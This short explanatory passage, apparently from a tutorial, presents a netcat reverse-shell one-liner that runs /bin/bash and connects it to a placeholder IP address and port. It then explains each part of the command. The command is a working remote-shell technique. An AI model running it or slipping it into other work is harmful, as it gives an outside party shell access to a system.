```bash
nc -e /bin/bash [IP_ADDRESS] [PORT]
```

- `-e`: This flag is used to specify that Netcat should execute a given command upon making a connection. It's important to note that this flag is not available in all versions of Netcat, particularly the traditional or "classic" version. Some systems may require using a different approach or a different version of Netcat that includes this functionality.

- `/bin/bash`: This is the command that Netcat is instructed to execute. In this case, it's invoking the Bash shell. When the connection is established, the remote user will have access to a Bash shell on the local system.

- `[IP_ADDRESS]`: This is a placeholder for the IP address of the machine that you want the reverse shell to connect to. 

- `[PORT]`: Similar to the IP address, this is a placeholder for the port number on which the controlling machine is listening.
